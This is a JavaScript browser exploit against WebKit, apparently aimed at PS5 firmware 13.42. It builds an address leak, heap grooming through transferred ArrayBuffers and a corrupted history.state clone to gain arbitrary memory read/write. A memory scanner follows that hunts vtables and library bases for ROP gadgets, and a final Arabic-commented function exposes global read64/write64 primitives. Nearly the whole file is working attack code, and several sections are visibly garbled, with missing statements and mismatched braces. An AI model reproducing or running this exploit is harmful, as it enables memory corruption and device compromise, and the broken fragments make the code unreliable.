function mark(tag, extra) {
    seq++;

        var xhr = new XMLHttpRequest();
        xhr.open("GET", "/log/" + encodeURIComponent(line), false);

    } catch (_) {}
    try { 
        var el = document.getElementById("out");
        el.appendChild(document.createTextNode(line));
        el.appendChild(document.createElement("br"));
    } catch (_) {}
}

function hex(value) {
    if (typeof value === "bigint") value = Number(value);
    if (typeof value !== "number" || !isFinite(value)) return "NaN";
    return "0x" + value.toString(16);
}

function buffer(size) {
    return new ArrayBuffer(size);
}

function leakScopeObject() {
    class Leaker { leak() { return super.foo; } }
    Leaker.prototype.__proto__ = new Proxy({}, {
        get: function (target, property, receiver) { return receiver; }
    });
    var leak = Leaker.prototype.leak;
    return (function () { return leak(); })();
}

function prepareSymbolWrapper(F) {
    leakedScope = leakScopeObject();
    if (leakedScope === undefined || leakedScope === null)
        throw new Error("scope-not-leaked");

    for (var i = 0; i < 512; i++)
        leakedScope["p" + i] = i;
    for (var j = 0; j < 8; j++)
        leakedScope[j] = 1.1 * j;

    Object.defineProperty(leakedScope, "g", { get: F, configurable: true });
    return Object(leakedScope.g);
}

function pointerFromWords(words, offset) {
    if (words[offset + 3] !== 0) return NaN;
    return words[offset] + words[offset + 1] * 0x10000 + words[offset + 2] * 0x100000000;
}

function plausibleCell(value) {
    return value > 0x100000000 && value <= 0xffffffffffff && value <= 9007199254740991
        && Math.floor(value) === value && value % 8 === 0;
}

function encodedHeaderNumber() {
    var raw = new ArrayBuffer(8);
    var u32 = new Uint32Array(raw);
    var f64 = new Float64Array(raw);
    u32[0] = 0x00004250;
    u32[1] = 0x01062800;
    return f64[0];
}

function buildFakeHost() {
    rwBuffer = new ArrayBuffer(0x100);
    rwView = new Uint8Array(rwBuffer);
    rwMirror = new Uint8Array(rwBuffer);
    rwMirror[0] = 0x3c;

    targetBuffer = new ArrayBuffer(0x20);
    targetView = new Uint8Array(targetBuffer);
    targetView[0] = 0xa5;
    lengthWord = { keep: 0x51515151 };

    fakeHost = {
        q0: encodedHeaderNumber(),
        q1: 1.1,
        q2: rwView,
        q3: lengthWord,
        q4: 2.2,
        q5: 3.3
    };

    delete fakeHost.q1;
    delete fakeHost.q4;
    delete fakeHost.q5;

    if (!isFinite(fakeHost.q0) || fakeHost.q2 !== rwView
        || fakeHost.q3 !== lengthWord || rwView[0] !== 0x3c
        || targetView[0] !== 0xa5)
        throw new Error("fake-host-shape-failed");
}

function buildAndStoreGraph() {
    referenceTarget = { marker: 0x51515151, kind: "serialized-reference" };
    buildFakeHost();

    mark("SSV-BUILD", "k=" + K + "-n=" + DRAIN_COUNT);
    fillerGraph = new Array(0xfffd);
    var pos = 0;
    var huge = 1n << 40n;
    for (var b = 0; b < FILLER_BIGINTS; ++b)
        fillerGraph[pos++] = huge + BigInt(b);
    for (var o = 0; o < FILLER_OBJECTS; ++o)
        fillerGraph[pos++] = {};

    outerGraph = new Array(CONTROL_INDEX + 1);
    outerGraph[0] = fillerGraph;
    outerGraph[1] = referenceTarget;
    outerGraph[2] = referenceTarget;
    outerGraph[CONTROL_INDEX] = CONTROL_INT;
    mark("SSV-BUILT", "duplicate-index=" + DUPLICATE_INDEX);

    mark("SSV-STORE-ENTER", "writer-ref=0x" + (0x10000 - K).toString(16));
    history.replaceState(outerGraph, "");
    mark("SSV-STORED", "fake-host-rw-target-not-serialized");
}

function prepareAddrof() {
    capturedWords = new Uint16Array(16);
    getterCarrier = function getterCarrierFunction() { return 7; };

    mark("ADDROF-PREP-BEGIN", "slots=" + CARRIER_SLOTS + "-bytes=" + CARRIER_BYTES);
    getterCarrier[0] = fakeHost;
    for (var i = 1; i < CARRIER_SLOTS; i++)
        getterCarrier[i] = 0;
    getterCarrier[1] = targetView;
    getterCarrier[2] = fakeHost;
    getterCarrier[3] = targetView;
    mark("ADDROF-CARRIER-DONE", "host-target-host-target");

    preparedSymbolObject = prepareSymbolWrapper(getterCarrier);
    mark("ADDROF-WRAPPER-READY", "wait=" + CAPTURE_DELAY_MS + "ms");

    setTimeout(runAddrofCapture, CAPTURE_DELAY_MS);
    setTimeout(beginComposition, COMPOSE_DELAY_MS);
}

function runAddrofCapture() {
    try {
        capturedString = symbolToString.call(preparedSymbolObject);
        copiedLength = capturedString.length;
        for (var i = 0; i < 16; i++)
            capturedWords[i] = capturedString.charCodeAt(7 + i);
        captureState = 1;
    } catch (error) {
        captureError = error;
        captureState = -1;
    }
}

function fillRawCellPointers(backing, pointer) {
    pointerHigh = Math.floor(pointer / 0x100000000);
    pointerLow = pointer - pointerHigh * 0x100000000;

    if (!plausibleCell(pointer)
        || pointerHigh < 0 || pointerHigh > 0xffff
        || Math.floor(pointerLow) !== pointerLow
        || pointerLow < 0 || pointerLow > 0xffffffff
        || pointerLow + pointerHigh * 0x100000000 !== pointer)
        throw new Error("invalid-low48-fake-address");

    predecessorWords = new Uint32Array(backing);
    for (var i = 0; i < predecessorWords.length; i += 2) {
        predecessorWords[i] = pointerLow;
        predecessorWords[i + 1] = pointerHigh;
    }

    var last = predecessorWords.length - 2;
    if (predecessorWords[0] !== pointerLow || predecessorWords[1] !== pointerHigh
        || predecessorWords[last] !== pointerLow || predecessorWords[last + 1] !== pointerHigh)
        throw new Error("pointer-fill-verification-failed");
}

function clearPredecessor() {
    if (predecessorWords !== null)
        predecessorWords.fill(0);
}

function uint32At(bytes, offset) {
    return bytes[offset] + bytes[offset + 1] * 0x100 + bytes[offset + 2] * 0x10000 + bytes[offset + 3] * 0x1000000;
}

function dumpHex(bytes) {
    var out = "";
    for (var i = 0; i < CELL_BYTES; ++i)
        out += (bytes[i] < 16 ? "0" : "") + bytes[i].toString(16);
    return out;
}

function loadHistoryCritical() {
    var result = null;
    var candidate = null;
    var rwHeaderCaptured = false;
    var rwVectorTouched = false;
    try {
        result = history.state;
        compositionLength = result.length;

        if (compositionLength !== EXPECTED_LENGTH) {
            result[DUPLICATE_INDEX] = undefined;
            result = null;
            clearPredecessor();
            retrySafe = true;
            compositionState = 3;
            return;
        }

        if (result[1] === result[DUPLICATE_INDEX]) {
            result[DUPLICATE_INDEX] = undefined;
            candidate = null;
            result = null;
            clearPredecessor();
            retrySafe = true;
            compositionState = 2;
            return;
        }

        candidate = result[DUPLICATE_INDEX];
        result[DUPLICATE_INDEX] = undefined;
        result = null;

        for (var i = 0; i < CELL_BYTES; ++i)
            rwHeader[i] = candidate[i];
        rwHeaderCaptured = true;

        var rwSID = rwHeader[0] + rwHeader[1] * 0x100 + rwHeader[2] * 0x10000 + rwHeader[3] * 0x1000000;
        var rwHeaderHigh = rwHeader[4] + rwHeader[5] * 0x100 + rwHeader[6] * 0x10000 + rwHeader[7] * 0x1000000;
        var rwButterfly = rwHeader[8] + rwHeader[9] * 0x100 + rwHeader[10] * 0x10000 + rwHeader[11] * 0x1000000
            + rwHeader[12] * 0x100000000 + rwHeader[13] * 0x10000000000;
        var rwVectorLow = rwHeader[0x10] + rwHeader[0x11] * 0x100 + rwHeader[0x12] * 0x10000 + rwHeader[0x13] * 0x1000000;
        var rwVectorHigh = rwHeader[0x14] + rwHeader[0x15] * 0x100;
        rwOriginalVector = rwVectorLow + rwVectorHigh * 0x100000000;

        var rwOffsetZero = true;
        for (var rz = 0x20; rz < 0x28; ++rz) {
            if (rwHeader[rz] !== 0) rwOffsetZero = false;
        }
        rwHeaderOK = rwSID >= 0x4000 && rwSID < 0x08000000
            && (rwSID & 0xf) === 0
            && rwHeader[4] === 0 && rwHeader[5] === 0x28 && rwHeader[6] === 0x08
            && (rwHeader[7] === 0 || rwHeader[7] === 1)
            && rwHeader[0x0e] === 0 && rwHeader[0x0f] === 0
            && rwButterfly > 0x100000000 && rwButterfly % 8 === 0
            && rwHeader[0x16] === 0 && rwHeader[0x17] === 0
            && rwOriginalVector > 0x100000000 && rwOriginalVector % 8 === 0
            && rwHeader[0x18] === 0 && rwHeader[0x19] === 1
            && rwHeader[0x1a] === 0 && rwHeader[0x1b] === 0
            && rwHeader[0x1c] === 0 && rwHeader[0x1d] === 0
            && rwHeader[0x1e] === 0 && rwHeader[0x1f] === 0
            && rwOffsetZero && rwHeader[0x28] === 0x58;

            candidate = null;
            clearPredecessor();
            compositionState = 3;

        var upgradedHeader = scratchDouble[0];

            clearPredecessor();
            compositionState = 3;
            return;

        if (fakeHost.q0 !== upgradedHeader) {
            candidate = null;
            clearPredecessor();
            compositionState = 3;

        scratchWords[1] = targetAddressHigh;
        rwVectorTouched = true;
        for (var w1 = 0; w1 < 8; ++w1)

        var targetVectorLow = targetHeader[0x10] + targetHeader[0x11] * 0x100 + targetHeader[0x12] * 0x10000 + targetHeader[0x13] * 0x1000000;
        var targetVectorHigh = targetHeader[0x14] + targetHeader[0x15] * 0x100;
        targetVector = targetVectorLow + targetVectorHigh * 0x100000000;

        var targetOffsetZero = true;
        for (var tz = 0x20; tz < 0x28; ++tz) {

        }
        targetHeaderOK = targetSID === rwSID
            && targetHeader[4] === 0 && targetHeader[5] === 0x28 && targetHeader[6] === 0x08

            && targetButterfly > 0x100000000 && targetButterfly % 8 === 0
            && targetHeader[0x16] === 0 && targetHeader[0x17] === 0

            && targetHeader[0x19] === 0 && targetHeader[0x1a] === 0

            && targetHeader[0x1d] === 0 && targetHeader[0x1e] === 0
            && targetHeader[0x1f] === 0 && targetOffsetZero

        if (!targetHeaderOK) {
            for (var r1 = 0; r1 < 8; ++r1)
                candidate[0x10 + r1] = rwHeader[0x10 + r1];
            rwVectorTouched = false;
            candidate = null;
            clearPredecessor();
            compositionState = 3;
            return;
        }

        scratchWords[0] = targetVectorLow;
        scratchWords[1] = targetVectorHigh;
        for (var w2 = 0; w2 < 8; ++w2)
            candidate[0x10 + w2] = scratchBytes[w2];

            for (var rRead = 0; rRead < 8; ++rRead)

            rwVectorTouched = false;
            targetView[0] = 0xa5;
            rwMirror[0] = 0x3c;
            candidate = null;
            clearPredecessor();
            compositionState = 3;
            return;
        }
        rwView[0] = 0x5a;
        writeObserved = rwView[0] === 0x5a && targetView[0] === 0x5a;
        rwView[0] = 0xa5;

        for (var r2 = 0; r2 < 8; ++r2)
            candidate[0x10 + r2] = rwHeader[0x10 + r2];
        rwVectorTouched = false;
        targetView[0] = 0xa5;
        rwMirror[0] = 0x3c;
        restoreObserved = rwView[0] === 0x3c

        savedCandidate = candidate;
        candidate = null;

function reportComposition() {
    if (compositionState < 0) {
        mark(retrySafe ? "SSV-PLACEMENT-MISS" : "LOAD-THREW",
            (compositionError && compositionError.name) + ":"
            + String(compositionError && compositionError.message).slice(0, 80));
        mark("DONE-THROW", "predecessor-cleared=true");
        if (!retrySafe) {
            try { sessionStorage.setItem(REVISION + ":blocked", "1"); } catch (_) {}
        }
        setTimeout(function () { mark("SURVIVED-THROW-T1000"); }, 1000);
        return;
    }

    if (compositionState === 2) {
        mark("NORMAL-CLONE-MISS", "known-reference-returned=true");
        mark("DONE-MISS", "predecessor-cleared=true");
        setTimeout(function () { mark("SURVIVED-MISS-T1000"); }, 1000);
        return;
    }

    if (compositionState === 3) {
        mark("HEADER-MISMATCH", "rw=" + rwHeaderOK + "-target=" + targetHeaderOK
            + "-carrier-restored=true");
        mark("RW-HEADER-HEX", dumpHex(rwHeader));
        mark("TARGET-HEADER-HEX", dumpHex(targetHeader));
        if (!retrySafe) {
            try { sessionStorage.setItem(REVISION + ":blocked", "1"); } catch (_) {}
        }
        setTimeout(function () { mark("SURVIVED-MISMATCH-T1000"); }, 1000);
        return;
    }

    if (compositionState === 0) {
        mark("NO-RESULT", "critical-load-did-not-finish");
        return;
    }

    mark("SSV-RETURNED-CLEARED", "length=" + compositionLength + "-predecessor-cleared=true");
    mark("RW-CARRIER", "sid=" + hex(uint32At(rwHeader, 0)) + "-vector=" + hex(rwOriginalVector)
        + "-length=0x100-mode=0x" + rwHeader[0x28].toString(16));
    mark("TARGET-CELL", "P=" + hex(targetAddress) + "-sid=" + hex(uint32At(targetHeader, 0))
        + "-vector=" + hex(targetVector) + "-length=0x20-mode=0x" + targetHeader[0x28].toString(16));
    mark("RW-HEADER-HEX", dumpHex(rwHeader));
    mark("TARGET-HEADER-HEX", dumpHex(targetHeader));

    var readPass = rwHeaderOK && targetHeaderOK && readObserved && compositionLength === EXPECTED_LENGTH;
    var writePass = writeObserved && restoreObserved;
    try { sessionStorage.setItem(REVISION + ":blocked", "1"); } catch (_) {}
    if (readPass)
        mark("ARBITRARY-READ-PASS", "target=owned-live-cell-and-backing");
    else
        mark("ARBITRARY-READ-MISMATCH", "rw-header=" + rwHeaderOK + "-target-header=" + targetHeaderOK
            + "-observed=" + readObserved + "-clone-length=" + (compositionLength === EXPECTED_LENGTH));

    if (writePass)
        mark("ARBITRARY-WRITE-PASS", "a5-to-5a-to-a5-restored=true");
    else
        mark("ARBITRARY-WRITE-MISMATCH", "write=" + writeObserved + "-restore=" + restoreObserved);

    if (readPass && writePass) {
        mark("GENUINE-U8-RW-PASS", "carrier-vector-restored=true");
        try { sessionStorage.setItem(REVISION + ":passed", "1"); } catch (_) {}
    }

    mark("ROOTS-LIVE", "rw-byte=" + rwView[0].toString(16) + "-target-byte=" + targetView[0].toString(16)
        + "-length-word=" + lengthWord.keep.toString(16));
    setTimeout(function () { mark("SURVIVED-T100"); }, 100);
    setTimeout(function () { mark("SURVIVED-T1000"); }, 1000);
    setTimeout(function () { mark("SURVIVED-T3000"); }, 3000);

    if (readPass && writePass && savedCandidate !== null) {
        setTimeout(function () {
            mark("PHASE2", "Auto-starting Scanner...");
            setTimeout(startMemoryScanner, 1500);
        }, 4000);
    }
}

function runGroomAndLoad() {
    try {
        mark("SSV-GROOM-ENTER", "n=" + DRAIN_COUNT);
        var channel = new MessageChannel();
        channel.port1.close();
        channel.port2.close();

        for (var i = 0; i < DRAIN_COUNT; ++i)
            keepAlive[keepIndex++] = buffer(DRAIN_SIZE);

        var slab = buffer(SLAB_SIZE);
        channel.port1.postMessage(0, [slab]);
        slab = null;

        var butterflyHole1 = buffer(BUTTERFLY_HOLE_SIZE);
        var butterflyHole2 = buffer(BUTTERFLY_HOLE_SIZE);
        var separator = buffer(SEPARATOR_SIZE);
        var earlyHole = buffer(EARLY_HOLE_SIZE);
        var guard = buffer(GUARD_SIZE);
        var predecessor = buffer(PREDECESSOR_SIZE);
        var finalHole = buffer(FINAL_HOLE_SIZE);

        fillRawCellPointers(predecessor, fakeAddress);
        keepAlive[keepIndex++] = separator;
        keepAlive[keepIndex++] = guard;
        keepAlive[keepIndex++] = predecessor;
        mark("PREDECESSOR-FILLED", "qwords=" + (PREDECESSOR_SIZE / 8) + "-fake=" + hex(fakeAddress));

        channel.port1.postMessage(0, [butterflyHole1, butterflyHole2, earlyHole, finalHole]);
        loadHistoryCritical();
    } catch (error) {
        try { clearPredecessor(); } catch (_) {}
        compositionError = error;
        compositionState = -1;
    }
    reportComposition();
}

function beginComposition() {
    if (captureState === 0) {
        mark("ADDROF-NO-RESULT", "capture-task-did-not-finish");
        return;
    }
    if (captureState < 0) {
        mark("ADDROF-THREW", (captureError && captureError.name) + ":"
            + String(captureError && captureError.message).slice(0, 80));
        return;
    }

    var a0 = pointerFromWords(capturedWords, 0);
    var b0 = pointerFromWords(capturedWords, 4);
    var a1 = pointerFromWords(capturedWords, 8);
    var b1 = pointerFromWords(capturedWords, 12);
    var repeated = a0 === a1 && b0 === b1;
    var distinct = a0 !== b0;
    var plausible = plausibleCell(a0) && plausibleCell(b0) && plausibleCell(a1) && plausibleCell(b1);
    var fakeChars = copiedLength >= 8 ? copiedLength - 8 : 0;
    var sourceCovered = fakeChars * 2 <= CARRIER_BYTES;

    mark("ADDROF-RETURNED", REVISION);
    mark("ADDROF-COPY", "chars=" + copiedLength + "-source-covered=" + sourceCovered);
    mark("ADDROF-POINTERS", "HOST=" + hex(a0) + "-TARGET=" + hex(b0)
        + "-HOST2=" + hex(a1) + "-TARGET2=" + hex(b1));

    if (!(repeated && distinct && plausible && sourceCovered)) {
        mark("ADDROF-FAIL", "repeat=" + repeated + "-distinct=" + distinct
            + "-plausible=" + plausible + "-covered=" + sourceCovered);
        return;
    }

    hostAddress = a0;
    targetAddress = b0;
    targetAddressHigh = Math.floor(targetAddress / 0x100000000);
    targetAddressLow = targetAddress - targetAddressHigh * 0x100000000;
    if (targetAddressHigh < 0 || targetAddressHigh > 0xffff
        || targetAddressLow < 0 || targetAddressLow > 0xffffffff
        || Math.floor(targetAddressLow) !== targetAddressLow
        || targetAddressLow + targetAddressHigh * 0x100000000 !== targetAddress) {
        mark("TARGET-ADDRESS-FAIL", "target=" + hex(targetAddress));
        return;
    }
    fakeAddress = hostAddress + 0x10;
    if (!plausibleCell(fakeAddress) || fakeAddress - hostAddress !== 0x10) {
        mark("FAKE-ADDRESS-FAIL", "host=" + hex(hostAddress));
        return;
    }
    mark("FAKE-ADDRESS", "host=" + hex(hostAddress) + "-fake=" + hex(fakeAddress) + "-delta=0x10");
    runGroomAndLoad();
}

var allowAgain = /(?:^|[?&])again=1(?:&|$)/.test(location.search);
allowAgain = true;
var attemptKey = REVISION + ":attempts";
var passKey = REVISION + ":passed";
var blockKey = REVISION + ":blocked";
var priorAttempts = 0;
var alreadyPassed = false;
var alreadyBlocked = false;
try {
    priorAttempts = parseInt(sessionStorage.getItem(attemptKey) || "0", 10);
    if (!isFinite(priorAttempts) || priorAttempts < 0) priorAttempts = 0;
    alreadyPassed = sessionStorage.getItem(passKey) === "1";
    alreadyBlocked = sessionStorage.getItem(blockKey) === "1";
} catch (_) {}
attemptNumber = priorAttempts + 1;

mark("BOOT", "rev=" + REVISION + "-k=" + K + "-n=" + DRAIN_COUNT
    + "-attempt=" + attemptNumber + "-max=" + MAX_ATTEMPTS);

if (alreadyPassed && !allowAgain) {
    mark("PASS-ALREADY-BLOCKED", "no-more-runs-needed");
} else if (alreadyBlocked && !allowAgain) {
    mark("CANDIDATE-RETURNED-BLOCKED", "manual-review-required");
} else if (priorAttempts >= MAX_ATTEMPTS && !allowAgain) {
    mark("RETRY-LIMIT", "max=" + MAX_ATTEMPTS + "-no-more-runs");
} else if (typeof BigInt !== "function" || typeof MessageChannel !== "function"
    || typeof Symbol !== "function" || typeof history === "undefined"
    || typeof history.replaceState !== "function") {
    mark("UNSUPPORTED");
} else {
    try { sessionStorage.setItem(attemptKey, String(attemptNumber)); } catch (_) {}
    try {
        buildAndStoreGraph();
        prepareAddrof();
    } catch (error) {
        mark("SETUP-THREW", (error && error.name) + ":" + String(error && error.message).slice(0, 80));
    }
}


// ============================================================
// PHASE 2: ADVANCED MEMORY SCANNER v4
// ============================================================
// Smart scan: follows pointers from headers first, then expands

var outEl = document.getElementById("out");

function p(text) {
    outEl.appendChild(document.createTextNode(text));
    outEl.appendChild(document.createElement("br"));
    outEl.scrollTop = outEl.scrollHeight;
}

function readQword(addr) {
    scratchWords[0] = addr & 0xFFFFFFFF;
    scratchWords[1] = (addr / 0x100000000) & 0xFFFF;
    for (var i = 0; i < 8; i++) savedCandidate[0x10 + i] = scratchBytes[i];
    var low = rwView[0] + rwView[1]*0x100 + rwView[2]*0x10000 + rwView[3]*0x1000000;
    var high = rwView[4] + rwView[5]*0x100 + rwView[6]*0x10000 + rwView[7]*0x1000000;
    var result = low + high * 0x100000000;
    for (var k = 0; k < 8; k++) savedCandidate[0x10 + k] = rwHeader[0x10 + k];
    return result;
}

function isPlausiblePointer(ptr) {
    return ptr > 0x10000000000 && ptr < 0x11000000000 && (ptr & 7) === 0;
}

function isPlausibleVtable(ptr) {
    return isPlausiblePointer(ptr) && ((ptr & 0xFFF) >= 0x20);
}

function getLibGuess(addr) {
    var base = addr & 0xFFFFFFFFF000;
    if (base >= 0x10040000000 && base < 0x10050000000) return "libWebKit";
    if (base >= 0x10050000000 && base < 0x10060000000) return "libkernel";
    if (base >= 0x10020000000 && base < 0x10030000000) return "libc";
    if (base >= 0x10060000000 && base < 0x10070000000) return "libSceLibcInternal";
    if (base >= 0x10070000000 && base < 0x10080000000) return "libSceSysmodule";
    return "unknown";
}

function startMemoryScanner() {
    if (scannerDone) return;
    scannerDone = true;

    p("");
    p("========================================");
    p("  PHASE 2: ADVANCED MEMORY SCANNER v4");
    p("  PS5 FW 13.42 | WebKit 605.1.15");
    p("========================================");

    // Step 1: Known addresses
    p("");
    p("-- STEP 1: KNOWN ADDRESSES --");
    p("Host:     " + hex(hostAddress));
    p("Fake:     " + hex(fakeAddress));
    p("Target:   " + hex(targetAddress));
    p("RW Vec:   " + hex(rwOriginalVector));
    p("Tgt Vec:  " + hex(targetVector));
    p("SID:      0x" + uint32At(rwHeader, 0).toString(16));

    // Step 2: Read headers and extract key pointers
    setTimeout(function() {
        p("");
        p("-- STEP 2: EXTRACTING POINTERS FROM HEADERS --");
        
        var hostPtrs = [];
        var targetPtrs = [];
        
        // Read host header
        p("Host header:");
        for (var h = 0; h < CELL_BYTES; h += 8) {
            try {
                var qw = readQword(hostAddress + h);
                p("  +" + h.toString(16).padStart(2,"0") + "  " + hex(qw));
                if (isPlausiblePointer(qw) && qw !== hostAddress && qw !== fakeAddress) {
                    hostPtrs.push({ off: h, val: qw });
                }
            } catch(e) { p("  +" + h.toString(16).padStart(2,"0") + "  READ FAILED"); }
        }
        
        // Read target header
        p("Target header:");
        for (var t = 0; t < CELL_BYTES; t += 8) {
            try {
                var qw2 = readQword(targetAddress + t);
                p("  +" + t.toString(16).padStart(2,"0") + "  " + hex(qw2));
                if (isPlausiblePointer(qw2) && qw2 !== targetAddress) {
                    targetPtrs.push({ off: t, val: qw2 });
                }
            } catch(e) { p("  +" + t.toString(16).padStart(2,"0") + "  READ FAILED"); }
        }

        // Step 3: Follow header pointers (SMART SCAN)
        setTimeout(function() {
            p("");
            p("-- STEP 3: FOLLOWING HEADER POINTERS --");
            var allPtrs = hostPtrs.concat(targetPtrs);
            var foundVtables = [];
            
            if (allPtrs.length === 0) {
                p("(No pointers found in headers)");
            } else {
                p("Found " + allPtrs.length + " pointers in headers:");
                allPtrs.forEach(function(ptr) {
                    p("  offset +" + hex(ptr.off) + " -> " + hex(ptr.val));
                    
                    // Check if this pointer itself points to a vtable
                    if (isPlausibleVtable(ptr.val)) {
                        p("    -> VTABLE CANDIDATE!");
                        foundVtables.push(ptr.val);
                    }
                    
                    // Read memory at this pointer (look for more pointers)
                    try {
                        var inner = readQword(ptr.val);
                        p("    -> dereference: " + hex(inner) + " " + getLibGuess(inner));
                        if (isPlausibleVtable(inner)) {
                            p("    -> INNER VTABLE!");
                            foundVtables.push(inner);
                        }
                    } catch(e) {}
                    
                    // Scan small region around this pointer
                    for (var s = ptr.val - 0x40; s < ptr.val + 0x40; s += 8) {
                        try {
                            var sv = readQword(s);
                            if (isPlausibleVtable(sv)) {
                                p("    -> nearby vtable @ " + hex(s) + ": " + hex(sv));
                                foundVtables.push(sv);
                            }
                        } catch(e) {}
                    }
                });
            }

            // Step 4: Wider scan if needed
            setTimeout(function() {
                if (foundVtables.length === 0) {
                    p("");
                    p("-- STEP 4: WIDER SCAN (host +/- 4KB) --");
                    var vtblCount = 0;
                    for (var v = hostAddress - 0x1000; v < hostAddress + 0x1000; v += 8) {
                        try {
                            var val = readQword(v);
                            if (isPlausibleVtable(val)) {
                                var entry = 0;
                                try { entry = readQword(val); } catch(e) {}
                                p("VTABLE @ " + hex(v));
                                p("  addr=" + hex(val) + " entry=" + hex(entry));
                                p("  lib=" + getLibGuess(val) + " base~" + hex(val & 0xFFFFFFFFF000));
                                foundVtables.push(val);
                                vtblCount++;
                                if (vtblCount >= 5) break;
                            }
                        } catch(e) {}
                    }
                    if (vtblCount === 0) p("(No vtables in wider region)");
                } else {
                    p("");
                    p("-- STEP 4: SKIPPED (found vtables in Step 3) --");
                }

                // Step 5: Summary and library base calculation
                setTimeout(function() {
                    p("");
                    p("========================================");
                    p("  SCAN COMPLETE");
                    p("========================================");
                    
                    if (foundVtables.length > 0) {
                        p("");
                        p("FOUND VTABLES:");
                        foundVtables.forEach(function(vt, i) {
                            var base = vt & 0xFFFFFFFFF000;
                            var lib = getLibGuess(vt);
                            p("  [" + i + "] " + hex(vt));
                            p("      Library: " + lib);
                            p("      Base:    " + hex(base));
                            p("      Offset:  0x" + (vt - base).toString(16));
                        });
                        p("");
                        p("NEXT: Use the base address above to");
                        p("      search for ROP gadgets.");
                    } else {
                        p("No vtables found.");
                        p("");
                        p("TROUBLESHOOTING:");
                        p("1. The vtable may be further away");
                        p("2. Try scanning around target +/- 8KB");
                        p("3. Or scan around RW vector " + hex(rwOriginalVector));
                    }
                    
                    p("");
                    p("KEY ADDRESSES FOR MANUAL SCAN:");
                    p("  Host:     " + hex(hostAddress));
                    p("  Target:   " + hex(targetAddress));
                    p("  RW Vec:   " + hex(rwOriginalVector));
                    p("  Tgt Vec:  " + hex(targetVector));
                    p("========================================");
                }, 500);
            }, 500);
        }, 500);
    }, 500);
}


// function - 1
function initPrimitives() {
    // التأكد من أن rwView و addrof معرفة مسبقاً في الصفحة
    if (typeof rwView === 'undefined' || typeof addrof === 'undefined') {
        console.log("[-] خطأ: لم يتم العثور على rwView أو addrof في الذاكرة!");
        return;
    }

    // ==========================================
    // 1. بناء أدوات read64 و write64 الديناميكية
    // ==========================================

    // الحصول على عنوان rwView في الذاكرة
    let addr_rwView = addrof(rwView); 
    console.log("[+] rwView Address: 0x" + addr_rwView.toString(16));

    // عنوان m_vector داخل rwView
    let addr_m_vector = addr_rwView + 0x10; 

    // حفظ العنوان الأصلي لـ m_vector
    let original_m_vector_low = rwView[0x10] | (rwView[0x11] << 8) | (rwView[0x12] << 16) | (rwView[0x13] << 24);
    let original_m_vector_high = rwView[0x14] | (rwView[0x15] << 8);
    let original_m_vector = original_m_vector_low + (original_m_vector_high * 0x100000000);

    console.log("[+] Original m_vector: 0x" + original_m_vector.toString(16));

    // دالة لتغيير العنوان الذي يقرأ منه rwView
    function setFakeVector(addr) {
        let low = addr_m_vector & 0xFFFFFFFF;
        let high = Math.floor(addr_m_vector / 0x100000000);
        
        rwView[0x10] = low & 0xff;
        rwView[0x11] = (low >> 8) & 0xff;
        rwView[0x12] = (low >> 16) & 0xff;
        rwView[0x13] = (low >> 24) & 0xff;
        rwView[0x14] = high & 0xff;
        rwView[0x15] = (high >> 8) & 0xff;
        
        let new_low = addr & 0xFFFFFFFF;
        let new_high = Math.floor(addr / 0x100000000);
        
        rwView[0] = new_low & 0xff;
        rwView[1] = (new_low >> 8) & 0xff;
        rwView[2] = (new_low >> 16) & 0xff;
        rwView[3] = (new_low >> 24) & 0xff;
        rwView[4] = new_high & 0xff;
        rwView[5] = (new_high >> 8) & 0xff;
        
        rwView[0x10] = low & 0xff;
        rwView[0x11] = (low >> 8) & 0xff;
        rwView[0x12] = (low >> 16) & 0xff;
        rwView[0x13] = (low >> 24) & 0xff;
        rwView[0x14] = high & 0xff;
        rwView[0x15] = (high >> 8) & 0xff;
    }

    // تعيين read64 و write64 على نطاق window لترتبط بالصفحة بشكل عام
    window.read64 = function(addr) {
        setFakeVector(addr);
        let low = rwView[0] | (rwView[1] << 8) | (rwView[2] << 16) | (rwView[3] << 24);
        let high = rwView[4] | (rwView[5] << 8) | (rwView[6] << 16) | (rwView[7] << 24);
        return {
            low: low >>> 0,
            high: high >>> 0,
            value: low + (high * 0x100000000)
        };
    };

    window.write64 = function(addr, value) {
        setFakeVector(addr);
        let low = value & 0xFFFFFFFF;
        let high = Math.floor(value / 0x100000000);
        
        rwView[0] = low & 0xff;
        rwView[1] = (low >> 8) & 0xff;
        rwView[2] = (low >> 16) & 0xff;
        rwView[3] = (low >> 24) & 0xff;
        rwView[4] = high & 0xff;
        rwView[5] = (high >> 8) & 0xff;
        rwView[6] = 0;
        rwView[7] = 0;
    };

    console.log("[+] Primitives Ready! Use read64(addr) and write64(addr, val)");
}
